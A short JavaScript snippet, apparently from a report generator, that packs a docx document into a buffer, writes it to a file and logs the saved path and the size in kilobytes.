Packer.toBuffer(doc).then(buffer => {
  fs.writeFileSync(outputPath, buffer);
  console.log(`Report saved to: ${outputPath}`);
  console.log(`Size: ${(buffer.length / 1024).toFixed(1)} KB`);
});
